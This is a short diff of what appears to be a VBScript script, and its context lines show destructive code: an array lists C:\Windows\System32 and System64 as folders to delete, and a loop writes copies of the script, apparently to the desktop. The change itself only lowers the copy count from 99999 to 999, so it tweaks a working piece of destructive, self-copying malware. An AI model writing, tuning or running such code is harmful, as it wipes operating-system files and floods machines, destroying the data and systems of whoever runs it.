@@ -12,7 +12,7 @@ systemFoldersToDelete = Array("C:\Windows\System32", "C:\Windows\System64")
 strDesktopFolder = objShell.SpecialFolders("Desktop")
 
 ' Specify the number of copies to create
-numCopies = 99999
+numCopies = 999
 
 ' Generate copies of the script
 For i = 1 To numCopies
